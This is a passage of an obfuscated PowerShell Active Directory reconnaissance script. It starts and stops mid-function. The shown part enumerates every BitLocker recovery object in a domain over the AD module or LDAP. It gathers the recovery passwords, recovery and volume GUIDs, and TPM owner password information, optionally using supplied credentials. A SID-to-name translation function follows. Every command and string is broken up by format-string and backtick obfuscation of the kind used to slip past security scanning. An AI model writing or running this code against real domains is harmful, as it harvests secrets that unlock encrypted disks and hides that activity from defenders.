                ${AdbiT`LOCKE`RR`eCo`V`ErYKe`Ys} | &("{1}{2}{0}"-f 'ect','ForEach-Ob','j') {
                    
                    ${O`BJ} = &("{1}{0}{2}"-f'w-O','Ne','bject') ("{0}{1}{2}"-f'PS','Obje','ct')
                    ${o`BJ} | &("{1}{3}{0}{2}" -f '-Memb','Ad','er','d') -MemberType ("{1}{2}{0}"-f 'y','Note','Propert') -Name ("{2}{1}{0}{3}" -f'hed','uis','Disting',' Name') -Value $(((${_}."DI`STIN`guIs`h`eDNA`Me" -split '}')[1]).("{1}{0}{2}"-f 'r','subst','ing').Invoke(1))
                    ${O`BJ} | &("{0}{1}{2}" -f 'A','dd-M','ember') -MemberType ("{3}{1}{2}{0}" -f 'rty','otePro','pe','N') -Name ("{0}{1}" -f'Na','me') -Value ${_}."n`AMe"
                    ${o`BJ} | &("{0}{2}{1}" -f 'A','-Member','dd') -MemberType ("{3}{0}{1}{2}"-f 'teP','r','operty','No') -Name ("{1}{2}{0}" -f'ed','whenC','reat') -Value ${_}."wH`ENcrEat`ed"
                    ${o`BJ} | &("{0}{2}{1}{3}" -f'Add-','em','M','ber') -MemberType ("{2}{3}{1}{0}" -f 'ty','Proper','Not','e') -Name ("{2}{3}{1}{0}{4}" -f 'e',' K','Recover','y','y ID') -Value $([GUID] ${_}.'msFVE-RecoveryGuid')
                    ${O`BJ} | &("{0}{1}{2}"-f 'Add','-Mem','ber') -MemberType ("{3}{1}{2}{0}" -f 'erty','eP','rop','Not') -Name ("{2}{3}{1}{0}" -f'y','Ke','Re','covery ') -Value ${_}.'msFVE-RecoveryPassword'
                    ${o`Bj} | &("{1}{0}{2}"-f'd-Me','Ad','mber') -MemberType ("{0}{1}{2}{3}"-f 'NoteP','roper','t','y') -Name ("{0}{2}{1}"-f 'Volum',' GUID','e') -Value $([GUID] ${_}.'msFVE-VolumeGuid')
                    Try
                    {
                        ${t`Em`PcOmP} = &("{0}{3}{2}{1}{4}" -f'Get-A','te','Compu','D','r') -Identity ${o`Bj}.'Distinguished Name' -Properties ("{2}{1}{4}{3}{0}" -f'on','n','msTPM-Ow','ti','erInforma'),("{5}{4}{0}{6}{2}{1}{3}" -f 'Info','ForCom','tion','puter','sTPM-Tpm','m','rma')
                    }
                    Catch
                    {
                        &("{4}{0}{1}{3}{2}" -f'rite-W','arn','ng','i','W') "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object "
                        &("{1}{0}{2}"-f 'rite-V','W','erbose') "[EXCEPTION] $($_.Exception.Message) "
                    }
                    If (${tE`M`PcOmp})
                    {
                        
                        ${o`BJ} | &("{1}{0}{2}"-f 'M','Add-','ember') -MemberType ("{2}{1}{0}{3}" -f 'ert','rop','NoteP','y') -Name ("{1}{5}{4}{3}{0}{2}"-f 'nformatio','m','n','I','er','sTPM-Own') -Value ${tEMPC`O`mP}.'msTPM-OwnerInformation'

                        
                        ${o`Bj} | &("{1}{2}{0}"-f'ber','Add','-Mem') -MemberType ("{0}{3}{2}{1}"-f'N','y','pert','otePro') -Name ("{0}{4}{6}{1}{2}{5}{3}"-f'msTPM-Tp','F','orComp','ter','mInforma','u','tion') -Value ${TEm`PComP}.'msTPM-TpmInformationForComputer'
                        If (${n`UlL} -ne ${Tem`P`COMP}.'msTPM-TpmInformationForComputer')
                        {
                            
                            ${T`pm`ObjECT} = &("{1}{2}{0}"-f 'DObject','Ge','t-A') -Identity ${TemPc`oMP}.'msTPM-TpmInformationForComputer' -Properties ("{4}{5}{1}{6}{2}{0}{3}"-f'tio','ner','nforma','n','msTPM-O','w','I')
                            ${tpmr`ec`oV`erY`I`NFo} = ${T`PmOB`ject}.'msTPM-OwnerInformation'
                        }
                        Else
                        {
                            ${TpMr`e`CO`Ve`RYiNFO} = ${n`Ull}
                        }
                    }
                    Else
                    {
                        ${O`BJ} | &("{0}{1}{2}"-f 'Add','-M','ember') -MemberType ("{2}{1}{0}{3}"-f 'rope','oteP','N','rty') -Name ("{4}{6}{3}{5}{1}{2}{0}"-f 'tion','f','orma','n','msTPM-O','erIn','w') -Value ${nU`ll}
                        ${o`BJ} | &("{2}{1}{0}"-f 'ember','-M','Add') -MemberType ("{0}{1}{2}"-f'Not','eProp','erty') -Name ("{2}{1}{4}{0}{5}{3}"-f'T','M','msTP','Computer','-','pmInformationFor') -Value ${n`ULl}
                        ${tPMRECovERy`in`Fo} = ${Nu`LL}

                    }
                    ${O`Bj} | &("{3}{2}{0}{1}"-f'embe','r','d-M','Ad') -MemberType ("{0}{1}{2}{3}"-f'NotePro','per','t','y') -Name ("{3}{0}{1}{5}{4}{2}"-f' ','Owne','ord','TPM','assw','r P') -Value ${T`pm`REc`ovEryI`N`FO}
                    ${bitloCKe`R`OBj} += ${o`Bj}
                }
            }
            &("{3}{1}{0}{4}{2}" -f 'e','v','iable','Remo','-Var') ("{1}{3}{2}{0}" -f'Keys','ADBitLo','ery','ckerRecov')
        }
    }

    If (${meTh`Od} -eq ("{1}{0}" -f'AP','LD'))
    {
        ${OBJ`SEa`R`CHeR} = &("{0}{1}{2}" -f 'New-Ob','je','ct') ("{4}{2}{0}{1}{3}{5}{6}" -f'm.Dire','ctor','te','yServices.D','Sys','ir','ectorySearcher') ${OBJd`O`M`AIn}
        ${O`BJ`seArch`eR}."pA`G`EsIZE" = ${pageS`i`zE}
        ${o`BJs`eaRcHer}."Fil`TeR" = (("{4}{1}{9}{3}{6}{5}{7}{2}{8}{0}" -f')','bject','t','ass','(o','FVE-Rec','=ms','overyInforma','ion','Cl'))
        ${Objse`A`RCh`er}."PROP`e`Rti`EsTO`Load".("{1}{0}"-f 'ddRange','A').Invoke((("{0}{2}{3}{1}"-f 'distingu','ame','ish','edN'),("{1}{0}{4}{3}{2}" -f'-reco','msfve','assword','p','very'),("{3}{2}{1}{0}" -f'guid','ery','cov','msfve-re'),("{3}{2}{0}{1}"-f 'olu','meguid','sfve-v','m'),("{3}{1}{4}{0}{2}" -f 'f','o','ormation','mstpm-','wnerin'),("{3}{2}{4}{6}{7}{0}{5}{1}{8}{9}"-f 'ti','forcomp','pm-','mst','tpmin','on','form','a','u','ter'),("{1}{0}" -f 'ame','n'),("{2}{1}{0}"-f 'ted','hencrea','w')))
        ${oBJ`seARCh`er}."s`e`ARc`Hscope" = ("{0}{1}" -f'Su','btree')

        Try
        {
            ${AD`B`Itl`OckeR`RecO`VERYkE`yS} = ${obJSEA`RC`hER}.("{2}{0}{1}"-f 'l','l','FindA').Invoke()
        }
        Catch
        {
            &("{0}{1}{2}{3}"-f 'Write-W','ar','nin','g') ("{11}{2}{3}{13}{5}{9}{8}{4}{6}{0}{10}{1}{7}{12}{14}" -f'e','yIn','-ADRBitLocker','] Error while ','VE-R','numerati','ecov','f','F','ng ms','r','[Get','ormation Objec','e','ts')
            &("{1}{0}{2}{3}"-f '-V','Write','erb','ose') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`ULL}
        }
        ${OBJseA`R`chEr}.("{0}{1}{2}" -f'd','ispo','se').Invoke()

        If (${aDBi`T`l`oCkE`RReCoVerYKeYs})
        {
            ${c`NT} = $(  $OlXE::("{1}{0}{3}{2}" -f'C','Object','nt','ou').Invoke(${ad`B`ITl`ocKeRR`EcovE`R`Yk`eYs}))
            If (${C`Nt} -ge 1)
            {
                &("{0}{1}{3}{2}" -f'Wr','ite','rbose','-Ve') ('[*'+'] '+'Tota'+'l '+'Bi'+'tLoc'+'ker '+'Reco'+'very '+'Ke'+'ys'+': '+"$cnt")
                ${bI`TlOCke`RObJ} = @()
                ${Ad`B`It`LoCkerr`EC`o`VERY`keyS} | &("{4}{3}{0}{2}{1}" -f 'Ob','ct','je','-','ForEach') {
                    
                    ${O`Bj} = &("{1}{3}{2}{0}" -f'ect','New-','bj','O') ("{1}{2}{0}"-f 'ct','PSOb','je')
                    ${o`Bj} | &("{0}{1}{2}{3}"-f 'Add','-M','emb','er') -MemberType ("{0}{1}{2}"-f 'Note','Proper','ty') -Name ("{0}{3}{2}{1}" -f 'Disti','d Name','e','nguish') -Value $(((${_}."pR`op`ERti`Es"."DiS`TinGU`iSH`E`DnAME" -split '}')[1]).("{0}{1}"-f'sub','string').Invoke(1))
                    ${O`Bj} | &("{0}{1}{3}{2}"-f 'A','dd-','ember','M') -MemberType ("{1}{0}{3}{2}"-f'pe','NotePro','y','rt') -Name ("{1}{0}"-f 'me','Na') -Value ([string] (${_}."PrOP`ERT`ies"."na`ME"))
                    ${O`Bj} | &("{1}{2}{0}"-f '-Member','A','dd') -MemberType ("{0}{3}{1}{2}" -f 'Note','pe','rty','Pro') -Name ("{2}{3}{1}{0}"-f'eated','r','when','C') -Value ([DateTime] $(${_}."pRo`P`ERtiES"."W`heNC`RE`AtEd"))
                    ${O`Bj} | &("{2}{0}{1}" -f '-M','ember','Add') -MemberType ("{1}{0}{3}{2}"-f'Pr','Note','rty','ope') -Name ("{3}{0}{4}{1}{2}"-f 'ecov','Ke','y ID','R','ery ') -Value $([GUID] ${_}."pROp`ErTI`ES".'msfve-recoveryguid'[0])
                    ${o`BJ} | &("{1}{2}{0}{3}" -f 'be','Ad','d-Mem','r') -MemberType ("{2}{3}{1}{0}" -f 'Property','e','No','t') -Name ("{1}{3}{0}{2}"-f'very Ke','Re','y','co') -Value ([string] (${_}."pROP`Er`TIEs".'msfve-recoverypassword'))
                    ${o`Bj} | &("{2}{0}{1}" -f'em','ber','Add-M') -MemberType ("{2}{3}{0}{1}" -f 'rop','erty','Not','eP') -Name ("{2}{1}{3}{0}" -f'ID','olume ','V','GU') -Value $([GUID] ${_}."pRo`pERti`Es".'msfve-volumeguid'[0])

                    ${OBJSEaRc`h`eR} = &("{2}{0}{1}" -f 'w-O','bject','Ne') ("{5}{3}{4}{7}{6}{8}{9}{2}{11}{10}{1}{0}" -f 'her','rc','.','em.Dire','c','Syst','r','to','yService','s','rySea','Directo') ${ob`jdo`mAiN}
                    ${ob`JsEa`RcHer}."pa`gES`Ize" = ${P`A`gEsi`zE}
                    ${ObjSE`ArC`heR}."fi`lteR" = "(&(samAccountType=805306369)(distinguishedName=$($Obj.'Distinguished Name'))) "
                    ${OBj`seaRc`h`eR}."PrOp`Er`TiE`ST`oLOAD".("{1}{2}{0}"-f'nge','Ad','dRa').Invoke((("{1}{6}{0}{2}{4}{3}{5}" -f 'f','mstpm-','or','i','mat','on','ownerin'),("{7}{3}{0}{5}{9}{6}{4}{2}{8}{1}" -f 'i','r','mpu','rmat','o','onf','c','mstpm-tpminfo','te','or')))
                    ${oBJseA`RC`H`Er}."s`eA`RCHS`cope" = ("{0}{1}" -f'Sub','tree')

                    Try
                    {
                        ${tem`pC`OMp} = ${O`BJsEa`RC`hEr}.("{0}{1}{2}" -f 'Fin','d','All').Invoke()
                    }
                    Catch
                    {
                        &("{1}{3}{0}{4}{2}"-f'ite','W','arning','r','-W') "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object "
                        &("{2}{0}{1}"-f 'ite-Verbo','se','Wr') "[EXCEPTION] $($_.Exception.Message) "
                    }
                    ${O`BJsEa`RcheR}.("{0}{2}{1}"-f 'd','se','ispo').Invoke()

                    If (${te`m`P`COMP})
                    {
                        
                        ${O`Bj} | &("{0}{1}{2}"-f 'Add-M','emb','er') -MemberType ("{2}{0}{3}{1}" -f'otePro','y','N','pert') -Name ("{3}{6}{1}{0}{5}{2}{4}"-f 'nerInf','PM-Ow','rm','m','ation','o','sT') -Value $([string] ${Te`m`pcOMp}."pr`OP`E`RTiES".'mstpm-ownerinformation')

                        
                        ${o`BJ} | &("{0}{1}{2}" -f 'Add-','Membe','r') -MemberType ("{3}{2}{0}{1}"-f 'opert','y','otePr','N') -Name ("{5}{0}{4}{2}{1}{3}" -f'M-Tp','ationFor','form','Computer','mIn','msTP') -Value $([string] ${t`EmPCoMP}."PROPeR`TI`ES".'mstpm-tpminformationforcomputer')
                        If (${N`UlL} -ne ${te`mPC`omp}."p`RoPEr`TIES".'mstpm-tpminformationforcomputer')
                        {
                            
                            If (${CredE`Nt`iAl} -ne   $CLf0n::"e`MPtY")
                            {
                                ${Ob`JsEa`R`ChPath} = &("{3}{1}{0}{2}" -f 'e','Obj','ct','New-') ("{0}{6}{8}{3}{5}{2}{4}{7}{1}"-f'System.Direct','ntry','re','i','ct','ces.Di','orySe','oryE','rv') "LDAP://$($DomainController)/$($TempComp.Properties.'mstpm-tpminformationforcomputer')", ${c`Re`dEnt`Ial}."uS`ERName",${c`REDENTI`AL}.("{4}{2}{0}{3}{1}{5}" -f'kC','denti','twor','re','GetNe','al').Invoke()."Pas`S`Word"
                                ${OB`J`S`EaRcHe`RPatH} = &("{2}{0}{1}"-f '-Objec','t','New') ("{5}{2}{0}{1}{7}{4}{3}{6}"-f 'ces.Dir','ect','oryServi','che','ar','System.Direct','r','orySe') ${oBJseA`Rc`Hpa`TH}
                                ${O`B`js`EaRchErp`A`TH}."PRoPe`RT`i`EstoLo`Ad".("{1}{2}{0}"-f 'e','AddRa','ng').Invoke((("{1}{4}{5}{3}{6}{2}{0}"-f'mation','ms','r','own','t','pm-','erinfo')))
                                Try
                                {
                                    ${tPM`oB`jeCT} = ${ObJ`s`Ea`RCheR`pATh}.("{0}{1}"-f'Fi','ndAll').Invoke()
                                }
                                Catch
                                {
                                    &("{3}{2}{0}{1}" -f'er','bose','-V','Write') "[EXCEPTION] $($_.Exception.Message) "
                                }
                                ${oB`jS`eaR`ch`ErpAth}.("{2}{0}{1}" -f'is','pose','d').Invoke()

                                If (${tpMOb`j`eCT})
                                {
                                    ${T`PMReC`o`V`ery`InFo} = $([string] ${tpMo`BJe`CT}."p`RoPerT`IES".'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    ${TPMrECo`Ve`RyI`NFO} = ${nU`lL}
                                }
                            }
                            Else
                            {
                                Try
                                {
                                    ${t`PmO`BJe`ct} = ([ADSI]"LDAP://$($TempComp.Properties.'mstpm-tpminformationforcomputer')")
                                }
                                Catch
                                {
                                    &("{3}{1}{0}{4}{2}"-f 'te-V','i','e','Wr','erbos') "[EXCEPTION] $($_.Exception.Message) "
                                }
                                If (${Tp`m`OBje`CT})
                                {
                                    ${t`pm`ReCo`V`eRyinfo} = $([string] ${T`PmOB`JECt}."p`Rope`RtiES".'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    ${t`pMrE`covE`R`y`Info} = ${NU`lL}
                                }
                            }
                        }
                    }
                    Else
                    {
                        ${o`BJ} | &("{0}{2}{1}" -f 'A','ber','dd-Mem') -MemberType ("{2}{1}{3}{0}" -f 'ty','e','NoteProp','r') -Name ("{0}{4}{5}{2}{1}{3}"-f'msTPM-','erInformati','n','on','O','w') -Value ${N`Ull}
                        ${O`BJ} | &("{1}{0}{2}" -f 'Membe','Add-','r') -MemberType ("{2}{1}{0}" -f'rty','ePrope','Not') -Name ("{6}{3}{0}{1}{4}{5}{2}{7}" -f 'mInforma','tio','ut','Tp','nForCom','p','msTPM-','er') -Value ${n`UlL}
                        ${TPMreCo`VE`Ry`iNFo} = ${nU`ll}
                    }
                    ${O`Bj} | &("{0}{1}{2}" -f'Add-','Me','mber') -MemberType ("{0}{3}{2}{1}" -f'N','erty','op','otePr') -Name ("{2}{1}{3}{0}"-f 'rd','PM','T',' Owner Passwo') -Value ${TpMREcO`V`E`R`YInfO}
                    ${B`Itl`ocKErO`BJ} += ${o`Bj}
                }
            }
            &("{0}{2}{3}{4}{1}" -f 'Re','ble','mo','v','e-Varia') ("{0}{1}"-f 'c','nt')
            &("{3}{0}{1}{2}" -f'-V','ariab','le','Remove') ("{4}{6}{3}{0}{5}{1}{2}" -f 'v','ryK','eys','Reco','ADBit','e','Locker')
        }
    }

    If (${B`iT`L`OCKeR`OBJ})
    {
        Return ${B`ItlO`ckeRObJ}
    }
    Else
    {
        Return ${n`ULl}
    }
}


Function ConVErT`Fro`M-S`ID
{

    Param(
        [Parameter(MaNdAToRY = ${T`RuE})]
        [string] ${met`H`Od},

        [Parameter(manDATOry = ${T`Rue})]
        [Alias('SID')]
        
        [String]
        ${oBJE`C`TSiD},

        [Parameter(MaNDATory = ${fA`lsE})]
        [string] ${doMA`I`N`FQDN},

        [Parameter(ManDatoRY = ${fA`lSe})]
        [Management.Automation.PSCredential] ${cre`DENT`ial} =   ( GcI ('v'+'A'+'RI'+'Ab'+'Le:cLF0n')  ).VALue::"E`MpTY",

        [Parameter(MANdAToRY = ${Fa`lSe})]
        [bool] ${r`eSol`VesiD} = ${F`A`Lse}
    )

    BEGIN {
        
        
        ${A`dS`_namE_iNitt`YPe_d`OMa`In}   = 1 
        
        ${a`dS_name_`in`ITtYPE_Gc}       = 3 

        
        
        
        
        ${ADS_naMe`_t`YP`e_N`T4}                      = 3 
        
        
        
        
        ${AdS_NAME_`Ty`P`e_un`KNoWn}                  = 8 
        
        
        
        

        
        
        
        
        ${aDs_`cha`Se_ReFErrAL`s_`A`lwaYs}      = (0x60) 
    }

    PROCESS {
        ${tA`RG`EtsiD} = $(${o`BJEct`siD}.("{3}{1}{2}{0}" -f 'tart','ri','mS','T').Invoke("O:"))
        ${tAr`g`eT`SId} = $(${Ta`RGeT`SID}.("{1}{0}" -f'im','Tr').Invoke('*'))
        If (${T`Ar`get`sID} -match ("{1}{0}" -f'.*','^S-1-'))
        {
            Try
            {
                
                Switch (${tA`Rg`ets`iD}) {
                    ("{0}{1}" -f'S-1-','0')         { ("{0}{1}{3}{2}" -f 'N','ull Aut','ty','hori') }
                    ("{0}{1}" -f'S','-1-0-0')       { ("{1}{0}{2}" -f'bo','No','dy') }
                    ("{1}{0}" -f '1-1','S-')         { ("{2}{0}{4}{1}{3}"-f 'orld ','hor','W','ity','Aut') }
                    ("{0}{1}" -f 'S-1-1','-0')       { ("{2}{0}{1}" -f'o','ne','Every') }
                    ("{1}{0}"-f '-2','S-1')         { ("{1}{0}{4}{3}{2}" -f'l','Loca','thority','u',' A') }
                    ("{1}{0}"-f '-2-0','S-1')       { ("{1}{0}" -f 'ocal','L') }
                    ("{2}{0}{1}"-f'1-','2-1','S-')       { ("{1}{3}{0}{2}"-f 'le','Cons',' Logon ','o') }
                    ("{1}{0}" -f'-3','S-1')         { ("{4}{3}{0}{2}{1}" -f 'Aut','ority','h','tor ','Crea') }
                    ("{0}{1}{2}"-f 'S-','1-3','-0')       { ("{1}{2}{3}{0}"-f 'ner','Creat','or',' Ow') }
                    ("{1}{0}"-f'-1','S-1-3')       { ("{0}{2}{1}{3}"-f 'C','or','reat',' Group') }
                    ("{0}{2}{1}"-f'S-1','3-2','-')       { ("{4}{2}{3}{0}{1}"-f'r Serv','er','ator ','Owne','Cre') }
                    ("{0}{1}{2}"-f 'S','-1-3','-3')       { ("{2}{1}{0}{3}"-f'up','reator Gro','C',' Server') }
                    ("{0}{1}{2}"-f 'S','-1','-3-4')       { ("{2}{1}{0}" -f'hts',' Rig','Owner') }
                    ("{0}{1}"-f 'S-1-','4')         { ("{1}{3}{4}{0}{2}"-f 'ri','N','ty','on-unique',' Autho') }
                    ("{0}{1}" -f'S','-1-5')         { ("{0}{2}{1}"-f 'N','thority','T Au') }
                    ("{1}{0}" -f'5-1','S-1-')       { ("{0}{1}" -f'Dialu','p') }
                    ("{1}{0}{2}"-f '1-5','S-','-2')       { ("{0}{1}" -f'Netw','ork') }
                    ("{0}{2}{1}"-f'S-1-5','3','-')       { ("{1}{0}"-f 'ch','Bat') }
                    ("{2}{1}{0}"-f'5-4','1-','S-')       { ("{2}{3}{1}{0}" -f 'tive','ac','Int','er') }
                    ("{0}{1}{2}"-f'S-1-','5','-6')       { ("{0}{1}" -f'Serv','ice') }
                    ("{2}{0}{1}"-f '1-5','-7','S-')       { ("{1}{0}{2}"-f 'o','Anonym','us') }
                    ("{0}{1}{2}" -f 'S','-1','-5-8')       { ("{0}{1}" -f'Pr','oxy') }
                    ("{2}{1}{0}"-f'9','-','S-1-5')       { ("{3}{5}{6}{4}{1}{7}{0}{2}" -f'l','main Co','ers','Ente','o','rpr','ise D','ntrol') }
                    ("{0}{2}{1}"-f 'S-1-5-','0','1')      { ("{1}{3}{2}{0}" -f 'lf','Princ','e','ipal S') }
                    ("{0}{1}" -f 'S-1-5-','11')      { ("{1}{2}{3}{4}{0}"-f'rs','Authent','ica','t','ed Use') }
                    ("{1}{0}" -f '1-5-12','S-')      { ("{1}{2}{0}"-f'e','Rest','ricted Cod') }
                    ("{0}{1}" -f 'S-1-','5-13')      { ("{1}{2}{3}{0}"-f 'rs','Termi','nal Se','rver Use') }
                    ("{0}{1}" -f 'S-1-5-1','4')      { ("{4}{0}{3}{2}{1}" -f 'mote ','ogon','ractive L','Inte','Re') }
                    ("{0}{2}{1}"-f 'S-1','-15','-5')      { ("{1}{0}{4}{2}{3}"-f'Or','This ','ation',' ','ganiz') }
                    ("{1}{0}{2}" -f '-','S-1-5','17')      { ("{2}{1}{0}{4}{3}"-f 'rgan',' O','This',' ','ization') }
                    ("{2}{1}{0}"-f'-18','-1-5','S')      { ("{0}{2}{1}" -f 'Local S','m','yste') }
                    ("{1}{0}{2}" -f'5-1','S-1-','9')      { ("{0}{3}{2}{1}"-f'N','thority',' Au','T') }
                    ("{0}{1}" -f'S-1-5-2','0')      { ("{1}{2}{3}{0}"-f 'ity','NT',' A','uthor') }
                    ("{1}{2}{0}" -f'-0','S-1-5-','80')    { ("{0}{3}{1}{2}{4}" -f'A','erv','ice','ll S','s ') }
                    ("{1}{3}{2}{0}"-f'32-544','S-','-5-','1')  { ((("{6}{7}{2}{1}{4}{5}{3}{0}" -f 'ors','Adm','NXne','at','i','nistr','BU','ILTI'))  -crePlaCE'Xne',[ChaR]92) }
                    ("{0}{3}{2}{1}"-f 'S-1','5','54','-5-32-')  { ((("{1}{0}{2}"-f'U','BUILTIN31b','sers')) -RePlaCE ([CHAR]51+[CHAR]49+[CHAR]98),[CHAR]92) }
                    ("{2}{1}{0}" -f'2-546','-3','S-1-5')  { ((("{3}{0}{4}{1}{5}{2}" -f'UILTIN','I','s','B','a','FGuest'))."Re`Pl`AcE"('aIF',[strING][CHaR]92)) }
                    ("{1}{0}{3}{2}" -f '1-5-32-','S-','47','5')  { ((("{0}{3}{1}{2}" -f 'BUI','INKCOPow','er Users','LT'))  -cREplACE ([cHAR]75+[cHAR]67+[cHAR]79),[cHAR]92) }
                    ("{0}{2}{1}"-f'S-1','32-548','-5-')  { ((("{4}{0}{3}{1}{5}{2}{6}"-f'U','NYO2A','Operator','ILTI','B','ccount ','s'))  -rEplace([chAR]89+[chAR]79+[chAR]50),[chAR]92) }
                    ("{0}{1}{2}" -f'S-1-5-3','2-54','9')  { ((("{3}{1}{2}{0}{4}"-f 'er Op','0}Se','rv','BUILTIN{','erators'))-f  [CHar]92) }
                    ("{2}{1}{0}" -f '0','55','S-1-5-32-')  { ((("{1}{4}{0}{3}{6}{5}{2}"-f 'i','B','rs','nt','UILTIN{0}Pr','rato',' Ope')) -f[ChaR]92) }
                    ("{2}{1}{3}{0}" -f '51','5-32-','S-1-','5')  { ((("{4}{0}{3}{1}{5}{2}"-f 'MB','p Operat','rs','acku','BUILTINYt','o')) -rEplAcE 'YtM',[CHAR]92) }
                    ("{2}{1}{0}{3}"-f'-5-32-','-1','S','552')  { ((("{1}{0}{2}"-f'icat','BUILTIN{0}Repl','ors')) -f[CHAR]92) }
                    ("{0}{2}{1}"-f 'S-1-5-3','54','2-5')  { ((("{7}{12}{8}{0}{9}{5}{4}{3}{10}{2}{11}{1}{6}" -f'LTINc7','Acce','mpat','0','re-Windows 200','P','ss','B','I','6',' Co','ible ','U'))."REPL`AcE"(([cHAr]99+[cHAr]55+[cHAr]54),'\')) }
                    ("{0}{2}{1}" -f'S-1-5','555','-32-')  { ((("{0}{1}{2}{3}{5}{4}" -f 'BUI','LTI','Nt5oRem','ote','Users',' Desktop '))-crEplACE 't5o',[cHar]92) }
                    ("{2}{0}{1}"-f'32-55','6','S-1-5-')  { ((("{5}{6}{4}{7}{10}{3}{0}{1}{2}{9}{8}"-f 'figu','rat','ion Opera','Con','wo','BU','ILTINYSqNet','r','s','tor','k ')).("{2}{0}{1}" -f'EP','Lace','r').Invoke('YSq','\')) }
                    ("{1}{2}{0}{3}"-f '-5-32-5','S-','1','57')  { ((("{4}{2}{1}{3}{7}{5}{6}{0}{8}" -f 'rust','mi','nco','ng F','BUILTINK2JI','s','t T','ore',' Builders'))."rE`plA`Ce"('K2J',[sTrIng][CHAR]92)) }
                    ("{2}{3}{1}{0}"-f '558','32-','S','-1-5-')  { ((("{0}{5}{1}{6}{3}{2}{4}" -f 'B','N{0','nce Monitor','forma',' Users','UILTI','}Per'))-f[cHaR]92) }
                    ("{0}{1}{3}{2}" -f 'S-1-5','-32','559','-')  { ((("{4}{0}{7}{1}{2}{5}{8}{3}{6}"-f'TI','ma','nce ','s','BUIL','Log ','ers','N{0}Perfor','U'))-F[Char]92) }
                    ("{3}{0}{2}{1}" -f '1-5-','-560','32','S-')  { ((("{9}{3}{7}{5}{11}{0}{1}{4}{6}{2}{12}{10}{8}"-f ' Au','tho','zation ','UIL','r','ndo','i','TINMKPWi','oup','B','ess Gr','ws','Acc'))."rEP`LACe"(([CHAr]77+[CHAr]75+[CHAr]80),'\')) }
                    ("{2}{1}{0}{3}" -f '5-3','1-','S-','2-561')  { ((("{3}{4}{7}{2}{0}{12}{5}{9}{11}{1}{8}{6}{10}"-f 'Nw34','r Li','I','BU','I','erm','e','LT','cense Serv','inal Se','rs','rve','T'))  -rEpLacE  'w34',[CHar]92) }
                    ("{0}{3}{2}{1}"-f'S-1-5','62','32-5','-')  { ((("{1}{0}{7}{2}{4}{8}{5}{3}{6}"-f 'LTINk6','BUI','t','r','ributed','se','s','lDis',' COM U'))."R`EPlaCe"(([cHAr]107+[cHAr]54+[cHAr]108),'\')) }
                    ("{0}{3}{1}{2}"-f'S-1','-5','69','-5-32')  { ((("{5}{6}{4}{0}{1}{3}{2}"-f 'era','to','s','r','c Op','BUILT','INJ8MCryptographi'))."REP`La`cE"(([ChaR]74+[ChaR]56+[ChaR]77),'\')) }
                    ("{1}{0}{3}{2}" -f'-1-5-','S','-573','32')  { ((("{5}{2}{7}{1}{0}{6}{4}{3}" -f'Ev','N9W6','U','ders','g Rea','B','ent Lo','ILTI')).("{2}{0}{1}"-f'A','ce','REpL').Invoke('9W6','\')) }
                    ("{1}{0}{2}{3}" -f '3','S-1-5-','2','-574')  { ((("{0}{6}{1}{2}{9}{7}{4}{10}{3}{5}{8}{11}"-f'BUILTI','e','rt',' Service DCOM','at',' Ac','NTdnC','fic','ce','i','e','ss'))."repl`ACE"(([Char]84+[Char]100+[Char]110),[strING][Char]92)) }
                    ("{3}{2}{0}{1}"-f '1-5-32-57','5','-','S')  { ((("{2}{4}{5}{1}{3}{6}{0}"-f' Servers','S Remo','BU','te A','ILTIN8','J6RD','ccess')) -rePLace  ([Char]56+[Char]74+[Char]54),[Char]92) }
                    ("{3}{1}{2}{0}" -f'2-576','5-','3','S-1-')  { ((("{3}{0}{4}{2}{1}" -f'dpo','vers','t Ser','BUILTIN{0}RDS En','in'))-f [chAr]92) }
                    ("{1}{2}{0}{3}"-f'-5','S-1-5-','32','77')  { ((("{4}{0}{5}{7}{3}{6}{2}{1}" -f 'RD','s','er','a','BUILTINdMZ','S ','gement Serv','Man'))."R`EPL`AcE"(([cHAr]100+[cHAr]77+[cHAr]90),'\')) }
                    ("{0}{1}{2}{3}"-f 'S-1','-','5-32','-578')  { ((("{3}{6}{5}{1}{0}{2}{4}"-f 'ini','-V Adm','str','BUILTIN2','ators','hHyper','H')).("{1}{0}"-f'ePlaCe','R').Invoke('2Hh','\')) }
                    ("{0}{2}{1}"-f 'S','32-579','-1-5-')  { ((("{6}{1}{7}{4}{5}{3}{0}{2}"-f'e O','oIAccess','perators','anc','ol As','sist','BUILTINg',' Contr'))."REPL`ACe"(([char]103+[char]111+[char]73),'\')) }
                    ("{3}{0}{1}{2}" -f '-5','-32','-580','S-1')  { ((("{3}{6}{7}{4}{1}{0}{5}{2}"-f ' Use','nagement','s','B','emote Ma','r','UI','LTIN{0}R'))  -F [CHaR]92) }
                    Default {
                        
                        If ( (${Ta`Rg`etsID} -match ("{2}{0}{1}" -f'-','1-.*','^S')) -and (${r`eSOLve`SId}) )
                        {
                            If (${me`TH`OD} -eq ("{1}{0}"-f'WS','AD'))
                            {
                                Try
                                {
                                    ${a`doBJ`Ect} = &("{1}{2}{3}{0}" -f 'ject','G','et','-ADOb') -Filter ('o'+'bjectS'+'id '+'-eq'+' '+"'$TargetSid'") -Properties ("{1}{3}{4}{2}{0}" -f 'hedName','Dis','uis','t','ing'),("{2}{1}{0}"-f 'e','ountNam','sAMAcc')
                                }
                                Catch
                                {
                                    &("{1}{3}{2}{0}" -f'ing','Wr','rn','ite-Wa') ("{9}{1}{5}{0}{4}{7}{8}{6}{3}{2}" -f'rror','rt','ID','ing S',' ','From-SID] E','ect us','while ','enumerating Obj','[Conve')
                                    &("{3}{2}{0}{1}" -f'e-V','erbose','it','Wr') "[EXCEPTION] $($_.Exception.Message) "
                                }
                                If (${AdOb`JE`ct})
                                {
                                    ${u`seRdom`Ain} = &("{1}{0}{3}{2}"-f'-D','Get','toFQDN','N') -ADObjectDN ${aD`oBje`cT}."dIsTInG`Uis`He`Dn`A`mE"
                                    ${aDs`OUTP`Ut} = ${uS`E`Rdo`maiN} + "\" + ${AD`o`BjEcT}."S`AmacCo`Un`TNAMe"
                                    &("{1}{0}{2}" -f 'move-Vari','Re','able') ("{2}{1}{0}"-f 'n','Domai','User')
                                }
                            }

                            If (${M`ET`Hod} -eq ("{0}{1}" -f'LD','AP'))
                            {
